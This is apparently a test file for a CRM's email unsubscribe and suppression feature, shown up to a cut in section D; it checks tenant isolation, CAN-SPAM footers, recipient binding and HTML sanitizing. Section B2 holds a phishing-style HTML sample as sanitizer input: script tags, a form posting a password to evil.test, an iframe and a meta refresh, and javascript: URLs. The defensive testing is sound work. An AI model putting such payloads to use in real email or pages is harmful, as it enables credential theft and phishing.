/**
 * tests/email-unsubscribe.test.js
 *
 * WHY THIS EXISTS (2026-09-22)
 * ────────────────────────────
 * The CRM had no email opt-out anywhere. This PR adds a per-tenant
 * suppression register (functions/email-suppression.js), a public
 * unsubscribe page + RFC 8058 one-click endpoint
 * (functions/email-unsubscribe.js), and gates every COMMERCIAL send path
 * on it. These scenarios drive the REAL handlers against stubbed firebase
 * modules at the module loader (the sms-send-optout-order.test.js idiom),
 * so what is asserted is what the handler DID:
 *
 *   A. the helper — category defaulting (fail closed), per-tenant ids,
 *      footer + List-Unsubscribe headers, throws on a read error
 *   B. sendEmail — commercial refused 403 'unsubscribed' (before every
 *      limiter), transactional allowed, register unreadable → 503, tenant
 *      isolation, footer + headers on a clean commercial send
 *   C. runAbandonRecovery (funnel-recovery.js) skips a suppressed visitor
 *   D. leadFollowUpSweep (lead-followup.js) skips a suppressed homeowner
 *   E. emailUnsubscribe — GET/HEAD no side effect; POST (page) and RFC 8058
 *      one-click POST record; idempotent; garbage / unknown token neutral
 *   F. markEmailUnsubscribed — who may mark
 *   G. every resend.emails.send() file is classified; every commercial one
 *      calls the gate
 *   H. the browser client — 403 unsubscribed and 503 suppression_unverified
 *      are final refusals (no mailto:), and `kind` reaches the server
 *
 * dormant-leads / review-request-nudge / anniversary-touch / storm-watch
 * email the CONTRACTOR, not the homeowner (verified 2026-09-22), so they are
 * classified 'internal' in SEND_PATHS and are not gated; C and D cover the
 * two automated senders that do email homeowners.
 *
 * Pure Node, no functions/ install needed. Run:
 *   node tests/email-unsubscribe.test.js
 */
'use strict';

const fs = require('fs');
const path = require('path');
const vm = require('vm');
const crypto = require('crypto');
const Module = require('module');

let passed = 0, failed = 0; const fails = [];
function ok(name, cond, detail) {
  if (cond) { passed++; console.log('  ✓ ' + name); }
  else { failed++; fails.push(name); console.log('  ✗ ' + name + (detail ? ' — ' + detail : '')); }
}

const ROOT = path.join(__dirname, '..');
const FUNCTIONS = path.join(ROOT, 'functions');
const sha = (e) => crypto.createHash('sha256').update(String(e).trim().toLowerCase()).digest('hex');

// ── Loader hook ─────────────────────────────────────────────────────────
let world = null;
const realLoad = Module._load;
Module._load = function (request, parent, isMain) {
  if (world && Object.prototype.hasOwnProperty.call(world.stubs, request)) return world.stubs[request];
  return realLoad.apply(this, arguments);
};

class HttpsError extends Error {
  constructor(code, message) { super(message); this.code = code; }
}

function makeWorld(opts) {
  opts = opts || {};
  const docs = Object.assign({}, opts.docs || {});
  const events = [];
  const writes = [];
  const sends = [];
  const adds = {};
  const logs = { error: [], warn: [], info: [] };
  const limited = new Set(opts.limited || []);
  const queries = opts.queries || {};

  const snapOf = (p) => ({ exists: docs[p] != null, id: p.split('/').pop(), data: () => docs[p], ref: docRef(p) });
  function docRef(p) {
    return {
      id: p.split('/').pop(),
      path: p,
      get: async () => {
        events.push('read:' + p);
        if (opts.readThrows && opts.readThrows(p)) throw new Error('simulated Firestore UNAVAILABLE');
        return snapOf(p);
      },
      set: async (data) => {
        if (opts.writeThrows && opts.writeThrows(p)) throw new Error('simulated write failure');
        events.push('write:' + p); writes.push({ path: p, data }); docs[p] = data;
      },
      update: async (data) => {
        events.push('update:' + p); writes.push({ path: p, data, update: true });
        docs[p] = Object.assign({}, docs[p] || {}, data);
      },
      collection: (n) => db.collection(p + '/' + n),
    };
  }
  function query(name) {
    const q = {
      where: () => q, orderBy: () => q, limit: () => q, startAfter: () => q,
      get: async () => {
        const rows = typeof queries[name] === 'function' ? queries[name]() : (queries[name] || []);
        const d = rows.map((r) => { docs[name + '/' + r.id] = r.data; return snapOf(name + '/' + r.id); });
        return { empty: d.length === 0, size: d.length, docs: d };
      },
    };
    return q;
  }
  const db = {
    doc: docRef,
    collection: (name) => Object.assign(query(name), {
      add: async (row) => { (adds[name] = adds[name] || []).push(row); events.push('add:' + name); return { id: 'x' }; },
      doc: (id) => docRef(name + '/' + id),
    }),
  };

  class Resend {
    constructor() {
      this.emails = {
        send: async (msg) => { events.push('resend-send'); sends.push(msg); return { data: { id: 're_1' }, error: null }; },
      };
    }
  }
  const rateLimitErr = () => { const e = new Error('rate_limited'); e.rateLimited = true; return e; };
  const limiter = {
    httpRateLimit: async (req, res, ns) => {
      events.push('limit:' + ns);
      if (limited.has(ns)) { res.status(429).json({ error: 'Too many requests' }); return false; }
      return true;
    },
    enforceRateLimit: async (ns) => {
      events.push('limit:' + ns);
      if (limited.has(ns)) throw rateLimitErr();
      return { count: 1 };
    },
    clientIp: () => '203.0.113.9',
    rateLimitIpKey: (ip) => ip,
  };
  const Timestamp = {
    fromMillis: (ms) => ({ toMillis: () => ms }),
    fromDate: (d) => ({ toMillis: () => d.getTime() }),
  };
  const stubs = {
    'firebase-functions/v2/https': {
      onRequest: (o, h) => ({ __opts: o, __handler: h }),
      onCall: (o, h) => ({ __opts: o, __handler: h }),
      HttpsError,
    },
    'firebase-functions/params': { defineSecret: (n) => ({ name: n, value: () => 'secret-' + n }) },
    'firebase-functions/v2': {
      logger: {
        error: (...a) => logs.error.push(a), warn: (...a) => logs.warn.push(a), info: (...a) => logs.info.push(a),
      },
    },
    'firebase-admin/firestore': {
      getFirestore: () => db,
      FieldValue: { serverTimestamp: () => '__server_ts__' },
      Timestamp,
    },
    'firebase-admin/auth': {
      getAuth: () => ({
        verifyIdToken: async () => {
          events.push('auth');
          // email_verified: sendEmail refuses unverified senders since 2026-10-01
          // (security checklist); the suite's rep is a real, verified one.
          return Object.assign({ uid: 'rep-a', companyId: 'co-a', role: 'sales_rep', email_verified: true }, opts.token || {});
        },
      }),
    },
    resend: { Resend },
    './rate-limit': limiter,
    './integrations/upstash-ratelimit': limiter,
    './integrations/_shared': { secretOr: (s, d) => d },
    './integrations/heartbeat': { onSchedule: (o, h) => ({ __opts: o, __handler: h }) },
    './lead-bridge-logic': { isFollowUpEvent: () => false },
  };
  return { stubs, docs, events, writes, sends, adds, logs };
}

function load(file, opts) {
  world = makeWorld(opts);
  for (const f of [file, 'email-suppression.js', 'resend-guard.js']) delete require.cache[path.join(FUNCTIONS, f)];
  return { mod: require(path.join(FUNCTIONS, file)), w: world };
}

function mkRes() {
  const r = { statusCode: 200, body: undefined, headers: {} };
  r.set = (k, v) => { r.headers[k] = v; return r; };
  r.status = (c) => { r.statusCode = c; return r; };
  r.json = (b) => { r.body = b; return r; };
  r.send = (b) => { r.body = b; return r; };
  return r;
}
async function invoke(handler, req) {
  const res = mkRes();
  try { await handler(req, res); } catch (e) { res.statusCode = 500; res.body = 'Internal Server Error'; res.threw = e; }
  return res;
}

const HOMEOWNER = 'Sam.Homeowner@Example.com';
const SUP_A = 'email_suppressions/co-a__' + sha(HOMEOWNER);
const SUP_B = 'email_suppressions/co-b__' + sha(HOMEOWNER);
const SUPPRESSED_A = { [SUP_A]: { companyId: 'co-a', emailHash: sha(HOMEOWNER), email: HOMEOWNER.toLowerCase(), source: 'link' } };
const NBD = '1phDvAVXHSg82wDLegAbQFq14Ci1';
// CAN-SPAM postal address (2026-10-03): a commercial send without one is
// BLOCKED, so every tenant the suite sends AS has one unless a case says not.
const POSTAL = 'PO Box 77, Goshen, OH 45122';
const withPostal = (...ids) => Object.fromEntries(ids.map((id) => ['companyProfile/' + id, { brand: { contact: { mailingAddress: POSTAL } } }]));

async function sendEmail(opts, body) {
  // Both fixtures by default (a scenario opts out with noLead / noPostal):
  //  - lead-1, the caller's own lead carrying the homeowner's address —
  //    sendEmail binds the recipient to a record the caller can open
  //    (security batch 2026-10-03);
  //  - the tenants' CAN-SPAM postal address (commercial sends need one).
  const o = Object.assign({}, opts || {});
  const tok = Object.assign({ uid: 'rep-a', companyId: 'co-a' }, o.token || {});
  if (!o.noPostal) o.docs = Object.assign(withPostal('co-a', 'co-b', 'solo-1'), o.docs || {});
  if (!o.noLead) {
    o.docs = Object.assign({
      'leads/lead-1': { userId: tok.uid, companyId: tok.companyId || tok.uid, email: HOMEOWNER },
    }, o.docs || {});
  }
  const { mod, w } = load('email-functions.js', o);
  const res = await invoke(mod.sendEmail.__handler, {
    method: 'POST',
    headers: { authorization: 'Bearer t' },
    body: Object.assign({ to: HOMEOWNER, subject: 'Checking in', body: 'Hi Sam', leadId: 'lead-1' }, body || {}),
  });
  return { res, w };
}

(async () => {
  // ═══ A. helper ═════════════════════════════════════════════════════════
  console.log('A. email-suppression.js');
  {
    world = null;
    delete require.cache[path.join(FUNCTIONS, 'email-suppression.js')];
    const S = require(path.join(FUNCTIONS, 'email-suppression.js'));
    ok('no category / no kind → commercial (fail closed)', S.resolveCategory({}) === 'commercial' && S.resolveCategory() === 'commercial');
    ok('unknown kind → commercial', S.resolveCategory({ kind: 'newsletter' }) === 'commercial');
    ok('a typo\'d category → commercial', S.resolveCategory({ category: 'Transactional' }) === 'commercial');
    ok('every allowlisted kind → transactional',
      S.TRANSACTIONAL_KINDS.every((k) => S.resolveCategory({ kind: k }) === 'transactional') && S.TRANSACTIONAL_KINDS.includes('invoice'));
    ok('explicit category:transactional → transactional', S.resolveCategory({ category: 'transactional' }) === 'transactional');
    ok('suppression id = companyId__sha256(lowercased, trimmed email) — no raw address',
      S.suppressionId('co-a', '  ' + HOMEOWNER + ' ') === 'co-a__' + sha(HOMEOWNER) && !/@/.test(S.suppressionId('co-a', HOMEOWNER)));
    ok('ids differ per tenant', S.suppressionId('co-a', HOMEOWNER) !== S.suppressionId('co-b', HOMEOWNER));
    ok('no id without a tenant, or with a tenant that could forge another prefix',
      S.suppressionId('', HOMEOWNER) === '' && S.suppressionId('co__x', HOMEOWNER) === '' && S.suppressionId('a/b', HOMEOWNER) === '');
    const t = new Set(); for (let i = 0; i < 50; i++) t.add(require('crypto').randomBytes(32).toString('base64url'));
    ok('token format is 256-bit base64url (43 chars) and the regex accepts it',
      [...t].every((x) => S.isToken(x)) && !S.isToken('short') && !S.isToken('a'.repeat(44)));
    ok('maskEmail keeps 2 chars + first domain letter', S.maskEmail('Sam.Homeowner@Example.com') === 'sa***@e***.com');

    const w = makeWorld({ docs: SUPPRESSED_A });
    const gA = await S.gateCommercialEmail({ doc: (p) => ({ get: async () => ({ exists: w.docs[p] != null }), set: async (d) => { w.docs[p] = d; } }) },
      { companyId: 'co-a', email: HOMEOWNER, source: 't' });
    ok('gate: suppressed for co-a', gA.suppressed === true && !gA.url);
    const minted = [];
    const gB = await S.gateCommercialEmail({ doc: (p) => ({ get: async () => ({ exists: w.docs[p] != null }), set: async (d) => { minted.push({ p, d }); } }) },
      { companyId: 'co-b', email: HOMEOWNER, leadId: 'L1', source: 't' }, { postalAddress: POSTAL });
    ok('gate: co-a\'s suppression does NOT block co-b (tenant isolation)', gB.suppressed === false);
    ok('gate: clear send mints a token doc with companyId + normalized email + leadId',
      minted.length === 1 && /^email_unsub_tokens\/[A-Za-z0-9_-]{43}$/.test(minted[0].p)
      && minted[0].d.companyId === 'co-b' && minted[0].d.email === HOMEOWNER.toLowerCase() && minted[0].d.leadId === 'L1');
    ok('gate: RFC 8058 headers (List-Unsubscribe <https url> + One-Click post)',
      /^<https:\/\/nobigdealwithjoedeal\.com\/unsubscribe\/[A-Za-z0-9_-]{43}>$/.test(gB.headers['List-Unsubscribe'])
      && gB.headers['List-Unsubscribe-Post'] === 'List-Unsubscribe=One-Click');
    const f = S.applyFooter(gB, '<html><body><p>Hi</p></body></html>', 'Hi');
    ok('applyFooter puts the link before </body> and appends to text',
      /Unsubscribe<\/a><br>[^<]+<\/p><\/body><\/html>$/.test(f.html) && f.html.indexOf(gB.url) > 0 && f.text.indexOf(gB.url) > 0);
    // ── CAN-SPAM postal address (2026-09-22 follow-up) ──────────────────
    // §7704(a)(5): a commercial email carries the sender's physical postal
    // address. PER TENANT, from that tenant's own companyProfile — a platform
    // default would print one contractor's address in another's mail.
    function dbWithProfile(profile, opts) {
      const o = opts || {};
      const reads = [];
      const db = {
        reads,
        doc: (p) => ({
          get: async () => {
            reads.push(p);
            if (p.indexOf('companyProfile/') === 0) {
              if (o.profileThrows) throw new Error('UNAVAILABLE');
              return profile === null ? { exists: false } : { exists: true, data: () => profile };
            }
            return { exists: false };
          },
          set: async () => {},
        }),
      };
      return db;
    }
    const ADDR = '1234 Main St Suite 5, Goshen, OH 45122';
    const gAddr = await S.gateCommercialEmail(
      dbWithProfile({ brand: { contact: { mailingAddress: ADDR } } }),
      { companyId: 'co-b', email: HOMEOWNER, source: 't' });
    ok('postal address: read from the tenant\'s OWN companyProfile', gAddr.postalAddress === ADDR);
    ok('postal address: appears in the HTML footer after the unsubscribe link',
      gAddr.footerHtml.indexOf('<br>' + ADDR) > gAddr.footerHtml.indexOf('Unsubscribe</a>'));
    ok('postal address: appears in the text footer', gAddr.footerText.indexOf(ADDR) > 0);

    const gNone = await S.gateCommercialEmail(dbWithProfile(null),
      { companyId: 'co-b', email: HOMEOWNER, source: 't' });
    ok('no address set → BLOCKED (reason no_postal_address), not suppressed, no link, no footer',
      gNone.blocked === true && gNone.reason === S.NO_POSTAL_ADDRESS && gNone.suppressed === false
      && !gNone.url && !gNone.footerHtml && !gNone.headers, JSON.stringify(gNone));
    {
      const mints = [];
      const dbM = dbWithProfile(null); dbM.doc = ((orig) => (p) => Object.assign(orig(p), { set: async (d) => { mints.push(p); } }))(dbM.doc);
      await S.gateCommercialEmail(dbM, { companyId: 'co-b', email: HOMEOWNER, source: 't' });
      ok('a blocked send mints NO unsubscribe token (checked before the mint)', mints.length === 0, mints.join());
    }

    // The NBD-leak shape: a tenant whose profile EXISTS but sets no mailing
    // address must get NO address — never a platform/NBD default, which would
    // print one contractor's postal address in another's marketing mail.
    // (`gNone` above returns early on a missing doc and never reaches the
    //  field read, so it does not cover this on its own.)
    const gEmptyField = await S.gateCommercialEmail(
      dbWithProfile({ brand: { contact: { phone: '(859) 420-7382' } } }),
      { companyId: 'co-b', email: HOMEOWNER, source: 't' });
    ok('a profile with NO mailingAddress → blocked — never a platform default address',
      gEmptyField.blocked === true && !gEmptyField.footerHtml);
    const gBlankField = await S.gateCommercialEmail(
      dbWithProfile({ brand: { contact: { mailingAddress: '   ' } } }),
      { companyId: 'co-b', email: HOMEOWNER, source: 't' });
    ok('a blank mailingAddress → blocked — never a platform default address',
      gBlankField.blocked === true && !gBlankField.footerHtml);

    const gSoft = await S.gateCommercialEmail(dbWithProfile(null, { profileThrows: true }),
      { companyId: 'co-b', email: HOMEOWNER, source: 't' });
    ok('an unreadable companyProfile → blocked (an address we cannot read is not on the email)',
      gSoft.blocked === true && gSoft.suppressed === false && !gSoft.url);

    const gXss = await S.gateCommercialEmail(
      dbWithProfile({ brand: { contact: { mailingAddress: '<script>alert(1)</script> PO Box 9' } } }),
      { companyId: 'co-b', email: HOMEOWNER, source: 't' });
    ok('postal address is HTML-escaped into the footer',
      !/<script>/.test(gXss.footerHtml) && /&lt;script&gt;/.test(gXss.footerHtml));

    ok('postal address normalizes newlines/tabs and truncates at POSTAL_MAX',
      S.normalizePostalAddress('PO Box 9\n\tGoshen,  OH') === 'PO Box 9 Goshen, OH'
      && S.normalizePostalAddress('x'.repeat(400)).length === S.POSTAL_MAX
      && S.normalizePostalAddress(null) === '' && S.normalizePostalAddress(undefined) === '');

    const dbPre = dbWithProfile({ brand: { contact: { mailingAddress: 'SHOULD NOT BE READ' } } });
    const gPre = await S.gateCommercialEmail(dbPre, { companyId: 'co-b', email: HOMEOWNER, source: 't' },
      { postalAddress: 'PO Box 77, Goshen, OH 45122' });
    ok('a caller-supplied address is used and skips the companyProfile read',
      gPre.postalAddress === 'PO Box 77, Goshen, OH 45122'
      && !dbPre.reads.some((p) => p.indexOf('companyProfile/') === 0));

    ok('tenantPostalAddress refuses a companyId that could escape the doc path',
      (await S.tenantPostalAddress(dbWithProfile({ brand: { contact: { mailingAddress: ADDR } } }), 'a/b')) === ''
      && (await S.tenantPostalAddress(dbWithProfile(null), '')) === '');

    let threw = null;
    try {
      await S.gateCommercialEmail({ doc: () => ({ get: async () => { throw new Error('UNAVAILABLE'); } }) }, { companyId: 'co-a', email: HOMEOWNER });
    } catch (e) { threw = e; }
    ok('gate THROWS on a read error (never "probably fine")', !!threw);
    threw = null;
    try { await S.gateCommercialEmail({ doc: () => ({ get: async () => ({ exists: false }) }) }, { companyId: '', email: HOMEOWNER }); } catch (e) { threw = e; }
    ok('gate THROWS with no tenant key', !!threw && threw.code === 'suppression_no_key');
    threw = null;
    try {
      await S.gateCommercialEmail({ doc: () => ({ get: () => new Promise(() => {}) }) }, { companyId: 'co-a', email: HOMEOWNER }, { timeoutMs: 30 });
    } catch (e) { threw = e; }
    ok('gate: a HUNG read rejects at the bound', !!threw && threw.code === 'suppression_read_timeout');
  }

  // ═══ B. sendEmail ══════════════════════════════════════════════════════
  console.log('B. sendEmail');
  {
    const { res, w } = await sendEmail({ docs: SUPPRESSED_A, limited: ['sendEmail:ip', 'sendEmail:uid'] });
    ok('commercial (no kind) to a suppressed address → 403 code unsubscribed',
      res.statusCode === 403 && res.body && res.body.code === 'unsubscribed' && /unsubscribed from email/.test(res.body.error), JSON.stringify(res.body));
    ok('refused BEFORE every limiter (limiters primed to 429, none touched)',
      !w.events.some((e) => /^limit:/.test(e)), w.events.join(' > '));
    ok('Resend never called', w.sends.length === 0);
    const row = (w.adds.email_log || [])[0];
    ok('email_log row: status suppressed, stamps leadId + uid + date (comm-log contract)',
      !!row && row.status === 'suppressed' && row.leadId === 'lead-1' && row.uid === 'rep-a' && row.date === '__server_ts__', JSON.stringify(row));
    ok('no unsubscribe token minted for a refused send', !w.writes.some((x) => /^email_unsub_tokens\//.test(x.path)));
  }
  {
    const { res, w } = await sendEmail({ docs: SUPPRESSED_A }, { kind: 'invoice', html: '<p>Invoice</p>' });
    ok('transactional (kind invoice) to a suppressed address still SENDS', res.statusCode === 200 && w.sends.length === 1, JSON.stringify(res.body));
    ok('transactional send: no List-Unsubscribe header, no footer, register not even read',
      !w.sends[0].headers && !/Unsubscribe/.test(w.sends[0].html) && !w.events.some((e) => e.startsWith('read:email_suppressions/')));
  }
  {
    const { res, w } = await sendEmail({ docs: SUPPRESSED_A }, { kind: 'marketing-blast' });
    ok('an unknown kind is commercial → refused', res.statusCode === 403 && w.sends.length === 0);
  }
  {
    const { res, w } = await sendEmail({ docs: SUPPRESSED_A, token: { uid: 'rep-b', companyId: 'co-b' } });
    ok('tenant isolation: co-a\'s unsubscribe does not block co-b\'s commercial send', res.statusCode === 200 && w.sends.length === 1);
    ok('...and the check read co-b\'s own key', w.events.includes('read:' + SUP_B));
    const m = w.sends[0];
    ok('clean commercial send carries List-Unsubscribe + List-Unsubscribe-Post',
      m.headers && /\/unsubscribe\/[A-Za-z0-9_-]{43}>$/.test(m.headers['List-Unsubscribe']) && m.headers['List-Unsubscribe-Post'] === 'List-Unsubscribe=One-Click');
    const tok = m.headers['List-Unsubscribe'].match(/([A-Za-z0-9_-]{43})>$/)[1];
    ok('...and the body footer links the SAME token', m.html.indexOf('/unsubscribe/' + tok) > 0 && /Don&#39;t want these emails\?|Don't want these emails\?/.test(m.html));
    ok('...and the token doc is filed under the SENDER\'s tenant',
      w.docs['email_unsub_tokens/' + tok] && w.docs['email_unsub_tokens/' + tok].companyId === 'co-b');
  }
  {
    const { res, w } = await sendEmail({ token: { uid: 'solo-1', companyId: undefined } });
    ok('claim-less solo operator: tenant key is the uid', res.statusCode === 200 && w.events.includes('read:email_suppressions/solo-1__' + sha(HOMEOWNER)));
  }
  {
    const { res, w } = await sendEmail({ readThrows: (p) => p.startsWith('email_suppressions/') });
    ok('register unreadable → 503 code suppression_unverified (not a plain 500)',
      res.statusCode === 503 && res.body && res.body.code === 'suppression_unverified');
    ok('...and nothing sent, no limiter touched', w.sends.length === 0 && !w.events.some((e) => /^limit:/.test(e)));
  }
  {
    const { res, w } = await sendEmail({ writeThrows: (p) => p.startsWith('email_unsub_tokens/') });
    ok('token mint failure → 503, nothing sent (a commercial email never goes without its unsubscribe link)',
      res.statusCode === 503 && w.sends.length === 0);
  }
  {
    const { res } = await sendEmail({ token: { role: 'viewer' }, docs: SUPPRESSED_A });
    ok('role refusal still wins first (viewer → 403 role message)', res.statusCode === 403 && /role cannot send/.test(res.body.error));
  }
  {
    // 2026-10-01 security checklist: an unverified account is not a sender
    // (it was a 200/day relay from the company domain), transactional or not.
    const { res, w } = await sendEmail({ token: { email_verified: false }, body: { kind: 'invoice' } });
    ok('an unverified sender → 403 email_unverified, nothing sent', res.statusCode === 403 && res.body.code === 'email_unverified' && w.sends.length === 0);
  }

  // ═══ B2. recipient binding + HTML sanitizing (security batch 2026-10-03) ═══
  // sendEmail used to take `to`, raw `html` and `replyTo` from any verified
  // caller — an open phishing relay from the company's noreply@ address.
  console.log('B2. sendEmail recipient binding');
  {
    const { res, w } = await sendEmail({}, { to: 'victim@elsewhere.test', kind: 'invoice' });
    ok('a `to` that is not on the named lead → 422 recipient_not_on_record, nothing sent',
      res.statusCode === 422 && res.body.code === 'recipient_not_on_record' && w.sends.length === 0,
      res.statusCode + ' ' + JSON.stringify(res.body));
  }
  {
    const { res, w } = await sendEmail({ noLead: true }, { leadId: undefined, to: 'victim@elsewhere.test', kind: 'invoice' });
    ok('no record named at all → 422 record_required, nothing sent',
      res.statusCode === 422 && res.body.code === 'record_required' && w.sends.length === 0,
      res.statusCode + ' ' + JSON.stringify(res.body));
  }
  {
    // Another tenant's lead: the attacker names it to borrow its address.
    const { res, w } = await sendEmail({
      docs: { 'leads/lead-1': { userId: 'rep-z', companyId: 'co-z', email: HOMEOWNER } },
    }, { kind: 'invoice' });
    ok('another tenant\'s lead → 403 record_forbidden, nothing sent',
      res.statusCode === 403 && res.body.code === 'record_forbidden' && w.sends.length === 0,
      res.statusCode + ' ' + JSON.stringify(res.body));
  }
  {
    // A teammate's lead: a manager may (rules: company reader), a sales_rep not.
    const teammate = { 'leads/lead-1': { userId: 'rep-other', companyId: 'co-a', email: HOMEOWNER } };
    const rep = await sendEmail({ docs: teammate }, { kind: 'invoice' });
    const mgr = await sendEmail({ docs: teammate, token: { role: 'manager' } }, { kind: 'invoice' });
    ok('teammate lead: sales_rep 403, manager of the same company sends',
      rep.res.statusCode === 403 && mgr.res.statusCode === 200 && mgr.w.sends.length === 1,
      rep.res.statusCode + ' / ' + mgr.res.statusCode);
  }
  {
    // Invoice path: the invoice's customerEmail is on record even when it
    // differs from the lead's address.
    const { res, w } = await sendEmail({
      noLead: true,
      docs: { 'invoices/inv-1': { companyId: 'co-a', createdBy: 'rep-a', customerEmail: 'billing@homeowner.test' } },
    }, { leadId: undefined, invoiceId: 'inv-1', to: 'billing@homeowner.test', kind: 'invoice', html: '<p>Invoice</p>' });
    ok('invoiceId in the caller\'s tenant → sends to the invoice\'s customerEmail',
      res.statusCode === 200 && w.sends.length === 1 && w.sends[0].to === 'billing@homeowner.test',
      res.statusCode + ' ' + JSON.stringify(res.body));
    const other = await sendEmail({
      noLead: true,
      docs: { 'invoices/inv-1': { companyId: 'co-z', createdBy: 'rep-z', customerEmail: 'billing@homeowner.test' } },
    }, { leadId: undefined, invoiceId: 'inv-1', to: 'billing@homeowner.test', kind: 'invoice', html: '<p>Invoice</p>' });
    ok('another tenant\'s invoice → 403, nothing sent', other.res.statusCode === 403 && other.w.sends.length === 0);
  }
  {
    const evil = '<p>Pay <a href="javascript:alert(1)">here</a></p><script>steal()</script>'
      + '<img src=x onerror="steal()"><form action="https://evil.test/collect"><input name="pw"></form>'
      + '<iframe src="https://evil.test"></iframe><a href="https://pay.stripe.com/x">Pay invoice</a>'
      + '<meta http-equiv="refresh" content="0;url=https://evil.test"><a href="data:text/html;base64,PHNjcmlwdD4=">x</a>';
    const { res, w } = await sendEmail({}, { kind: 'invoice', html: evil, replyTo: 'attacker@evil.test' });
    const sent = (w.sends[0] && w.sends[0].html) || '';
    ok('sanitized HTML: no <script>, <iframe>, <form>, <input>, on* handlers, javascript:/data:text URLs, meta refresh',
      res.statusCode === 200 && !/<script|<iframe|<form|<input|onerror|javascript:|data:text|http-equiv/i.test(sent), sent);
    ok('…while ordinary links and text survive', /href="https:\/\/pay\.stripe\.com\/x"/.test(sent) && /Pay invoice/.test(sent));
    ok('replyTo that is not the caller\'s own address is dropped', w.sends[0] && w.sends[0].reply_to === undefined,
      JSON.stringify(w.sends[0] && w.sends[0].reply_to));
  }
  {
    const { w } = await sendEmail({ token: { email: 'rep@co-a.test' } }, { kind: 'invoice', replyTo: 'REP@co-a.test' });
    ok('replyTo equal to the caller\'s own verified email is kept', w.sends[0] && w.sends[0].reply_to === 'rep@co-a.test');
  }
  {
    const { w } = await sendEmail({}, { kind: 'invoice', body: 'Hi <b onmouseover=x>Sam</b>\nLine 2' });
    const sent = (w.sends[0] && w.sends[0].html) || '';
    ok('a plain-text body is escaped, not interpolated as HTML', /&lt;b onmouseover=x&gt;/.test(sent) && !/<b /.test(sent) && /<br>/.test(sent), sent);
  }
  {
    const { w } = await sendEmail({}, { kind: 'invoice', attachments: [{ filename: 'a.pdf', path: 'https://evil.test/a.pdf' }] });
    ok('caller attachments are not forwarded to Resend', w.sends[0] && w.sends[0].attachments === undefined);
  }
  {
    const { res, w } = await sendEmail({ noPostal: true });
    ok('CAN-SPAM: commercial send with NO tenant postal address → 403 no_postal_address (final, no mailto)',
      res.statusCode === 403 && res.body && res.body.code === 'no_postal_address' && /Mailing Address/.test(res.body.error), JSON.stringify(res.body));
    ok('...nothing sent, no unsubscribe token minted', w.sends.length === 0 && !w.writes.some((x) => /^email_unsub_tokens\//.test(x.path)));
    const row = (w.adds.email_log || [])[0];
    ok('...and the refusal is logged (email_log status blocked_no_postal_address)', !!row && row.status === 'blocked_no_postal_address', JSON.stringify(row));
  }
  for (const kind of ['invoice', 'receipt', 'estimate', 'appointment']) {
    const { res, w } = await sendEmail({ noPostal: true }, { kind, html: '<p>Your ' + kind + '</p>' });
    ok('transactional (' + kind + ') with NO postal address still SENDS, untouched', res.statusCode === 200 && w.sends.length === 1 && !/Unsubscribe/.test(w.sends[0].html), JSON.stringify(res.body));
  }
  {
    const { res, w } = await sendEmail({});
    const m = w.sends[0];
    ok('with an address set, the commercial footer carries it', res.statusCode === 200 && !!m && m.html.indexOf(POSTAL) > 0);
  }

  // ═══ C. funnel-recovery ════════════════════════════════════════════════
  console.log('C. runAbandonRecovery');
  {
    process.env.FUNNEL_RECOVERY_ENABLED = 'true';
    process.env.RESEND_API_KEY = 'k';
    const old = { toMillis: () => Date.now() - 2 * 3600e3 };
    const { mod, w } = load('funnel-recovery.js', {
      docs: Object.assign(withPostal(NBD), { ['email_suppressions/' + NBD + '__' + sha('gone@example.com')]: { companyId: NBD } }),
      queries: {
        funnel_abandoned: [
          { id: 'f-supp', data: { email: 'Gone@Example.com', firstName: 'G', createdAt: old } },
          { id: 'f-ok', data: { email: 'stay@example.com', firstName: 'S', createdAt: old } },
        ],
      },
    });
    await mod.runAbandonRecovery.__handler({});
    ok('suppressed visitor: no email', !w.sends.some((m) => /gone@example\.com/i.test(m.to)));
    ok('suppressed visitor: record stamped suppressed (terminal), never claimed "sending"',
      w.docs['funnel_abandoned/f-supp'].recoveryEmailStatus === 'suppressed');
    const m = w.sends.find((x) => x.to === 'stay@example.com');
    ok('clean visitor: sent with List-Unsubscribe headers + campaign header kept',
      !!m && m.headers['List-Unsubscribe-Post'] === 'List-Unsubscribe=One-Click' && m.headers['X-NBD-Campaign'] === 'funnel-recovery-v1');
    ok('clean visitor: html AND text carry the unsubscribe link',
      !!m && /\/unsubscribe\//.test(m.html) && /\/unsubscribe\//.test(m.text));
    ok('checked against NBD\'s tenant key', w.events.includes('read:email_suppressions/' + NBD + '__' + sha('stay@example.com')));
  }
  {
    const old = { toMillis: () => Date.now() - 2 * 3600e3 };
    const { mod, w } = load('funnel-recovery.js', {
      readThrows: (p) => p.startsWith('email_suppressions/'),
      queries: { funnel_abandoned: [{ id: 'f-x', data: { email: 'x@example.com', createdAt: old } }] },
    });
    await mod.runAbandonRecovery.__handler({});
    ok('register unreadable: nothing sent and the record is NOT claimed (retried next hour)',
      w.sends.length === 0 && !w.docs['funnel_abandoned/f-x'].recoveryEmailStatus);
  }
  {
    // Dry run (the default in prod until enabled): the log line must not carry
    // the visitor's name — PII in logs (security batch 2026-10-03).
    const prev = process.env.FUNNEL_RECOVERY_ENABLED;
    process.env.FUNNEL_RECOVERY_ENABLED = 'false';
    const old = { toMillis: () => Date.now() - 2 * 3600e3 };
    const { mod, w } = load('funnel-recovery.js', {
      queries: { funnel_abandoned: [{ id: 'f-dry', data: { email: 'dry@example.com', firstName: 'Zebulon', createdAt: old } }] },
    });
    await mod.runAbandonRecovery.__handler({});
    process.env.FUNNEL_RECOVERY_ENABLED = prev;
    const dry = w.logs.info.filter((a) => a[0] === 'funnel_recovery_dry_run');
    ok('dry-run log names no visitor (no firstName, no raw email)',
      dry.length === 1 && !/Zebulon|dry@example\.com/.test(JSON.stringify(dry)), JSON.stringify(dry));
  }
  {
    const old = { toMillis: () => Date.now() - 2 * 3600e3 };
    const { mod, w } = load('funnel-recovery.js', {
      queries: { funnel_abandoned: [{ id: 'f-np', data: { email: 'np@example.com', createdAt: old } }] },
    });
    await mod.runAbandonRecovery.__handler({});
    ok('CAN-SPAM: NBD has no postal address → recovery email NOT sent', w.sends.length === 0);
    ok('...record left unclaimed and unstamped (sends later once the address is set)', !w.docs['funnel_abandoned/f-np'].recoveryEmailStatus);
    const done = w.logs.info.find((a) => a[0] === 'funnel_recovery_done');
    ok('...and counted: funnel_recovery_done.blockedNoAddress === 1', !!done && done[1].blockedNoAddress === 1, JSON.stringify(done));
  }

  // ═══ D. lead-followup ══════════════════════════════════════════════════
  console.log('D. leadFollowUpSweep');
  // The sweep follows up NBD's own leads only (isNbdLead: no companyId, or
